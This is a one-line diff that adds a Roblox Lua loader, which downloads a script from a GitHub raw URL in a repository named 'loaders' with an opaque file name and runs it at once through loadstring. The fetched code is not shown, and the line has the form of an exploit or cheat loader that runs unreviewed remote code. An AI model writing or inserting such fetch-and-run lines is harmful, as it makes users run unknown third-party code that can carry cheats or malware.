@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Frontierpifurnace41/loaders/main/loaders/upd-8-cvr-retro-spam7-9px8zsu3ixunaa.lua"))()
